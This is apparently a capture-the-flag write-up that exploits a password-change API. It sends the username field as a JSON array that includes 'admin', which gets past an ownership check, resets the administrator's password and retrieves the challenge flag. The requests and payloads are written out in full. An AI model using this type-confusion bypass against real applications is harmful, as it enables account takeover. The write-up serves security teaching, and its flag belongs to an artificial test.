# Tanuki - tanuki-009 - Can you update the admin's password?

## 1. Find the Password Change Function

After registering or logging into the application, navigate to:

```text
Settings → Change Password
```

The password-change request is sent to:

```http
POST /api/profile/change-password
```

Capture the request using **Burp Suite → Proxy → HTTP history**.


## 2. Observe the Normal Request

The application sends:

```http
POST /api/profile/change-password
Content-Type: application/json
Authorization: Bearer <YOUR_TOKEN>
```

with the following JSON:

```json
{
  "username": "fashil",
  "newPassword": "qwertyuiop"
}
```

The server responds:

```json
{
  "message": "Password updated",
  "accounts_updated": 1
}
```

This shows that the `username` value is used by the password-change endpoint.


## 3. Test Direct Admin Modification

Send the request to **Burp Repeater** and change the username to `admin`:

```json
{
  "username": "admin",
  "newPassword": "qwertyuiop"
}
```

The server rejects the request:

```json
{
  "error": "You can only change your own password"
}
```

Therefore, directly changing the admin password is blocked.


## 4. Test the Input Type

The application appears to expect `username` to be a single string.

Test whether it accepts multiple usernames by changing the value into an array:

```json
{
  "username": ["fashil", "admin"],
  "newPassword": "qwertyuiop"
}
```

Send the request.


## 5. Observe the Response

The server responds:

```json
{
  "message": "Password updated",
  "accounts_updated": 2
}
```

This is the important result.

The application accepted the array and updated **two accounts**.

The password:

```text
qwertyuiop
```

has therefore been applied to both:

```text
fashil
admin
```

## 6. Log in as Admin

Open a new private/incognito browser session so the existing user session does not interfere.

Navigate to the login page and enter:

```text
Username: admin
Password: qwertyuiop
```

Log in.

## 7. Open the Admin Dashboard

After successful authentication, navigate to the **Admin Dashboard**.

The dashboard contains the challenge flag:

```text
bug{PPNAvtFsT4ZKXT7O23xrgZNxcocLmTB7}
```

# Exploit Summary

### Normal request

```json
{
  "username": "fashil",
  "newPassword": "qwertyuiop"
}
```

Result:

```json
{
  "message": "Password updated",
  "accounts_updated": 1
}
```

### Direct attack

```json
{
  "username": "admin",
  "newPassword": "qwertyuiop"
}
```

Result:

```json
{
  "error": "You can only change your own password"
}
```

### Bypass

```json
{
  "username": ["fashil", "admin"],
  "newPassword": "qwertyuiop"
}
```

Result:

```json
{
  "message": "Password updated",
  "accounts_updated": 2
}
```

### Flag

```text
bug{PPNAvtFsT4ZKXT7O23xrgZNxcocLmTB7}
```

## Vulnerability

The endpoint performs an authorization check intended for a single username but fails to properly validate the **type and structure of the `username` input**.

By supplying an array containing the attacker's username and `admin`, the request passes the ownership check while the backend processes both accounts.

This results in an **authorization bypass through improper input validation/type handling**, allowing the attacker to change the administrator's password.
